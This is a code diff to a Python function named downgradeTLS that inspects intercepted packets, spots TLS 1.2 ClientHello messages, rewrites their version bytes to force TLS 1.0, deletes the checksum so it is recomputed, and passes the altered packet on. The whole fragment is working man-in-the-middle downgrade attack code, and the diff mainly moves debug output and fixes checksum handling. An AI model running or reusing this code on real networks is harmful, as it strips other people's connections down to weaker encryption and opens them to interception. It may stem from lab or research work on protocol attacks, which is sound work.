@@ -38,19 +38,15 @@ def downgradeTLS(packet):
     # Adjusted the matching rules for Python 2 and old Scapy.
     if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
       print("TLS handshake found, client HELLO.")
-      print("-----")
-      print(pkt.command()) 
-      print("-----")
-      print(pkt.show()) 
-      print("-----")
-      
-      # By testing with these two and adding .len or .cksum we confirm: the layers don't have those.
-      # Very very odd! Why would there not be a cksum or len??
-      #print(pkt.getlayer(IP).len)
-      #print(pkt.getlayer(TCP).len)
       
       if tcpPayload[9] == '\x03' and tcpPayload[10] == '\x03':
         print("TLS v1.2, dropping down to v1.0")
+        print("-----")
+        print(pkt.command()) 
+        print("-----")
+        print(pkt.show()) 
+        print("-----")
+
         msgBytes = packet.get_payload()        # msgBytes is read-only, copy it
         msgBytes2 = [b for b in msgBytes]
 
@@ -67,6 +63,8 @@ def downgradeTLS(packet):
 
         msg=b''.join(msgBytes2)
         packet.set_payload(msg)
+
+        del packet.chksum
 
       packet.accept()                                                                     
     else:                                                                              
